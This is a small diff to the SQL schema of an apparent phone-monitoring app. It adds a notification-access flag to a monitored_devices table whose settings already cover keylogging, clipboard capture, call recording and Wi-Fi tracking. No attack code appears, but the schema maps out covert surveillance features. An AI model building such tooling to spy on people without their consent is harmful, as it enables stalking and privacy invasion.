@@ -66,6 +66,7 @@ CREATE TABLE IF NOT EXISTS public.monitored_devices (
   telemetry_config JSONB NOT NULL DEFAULT '{"notifications":false,"keylogger":false,"clipboard":false,"wifi":false,"lock_events":false,"call_recording":false,"screen_time":false}'::jsonb,
   is_device_admin BOOLEAN DEFAULT false,
   is_accessibility_active BOOLEAN DEFAULT false,
+  is_notification_active BOOLEAN DEFAULT false,
   is_battery_unrestricted BOOLEAN DEFAULT false,
   current_wifi_ssid TEXT DEFAULT NULL,
   created_at TIMESTAMPTZ NOT NULL DEFAULT now(), updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
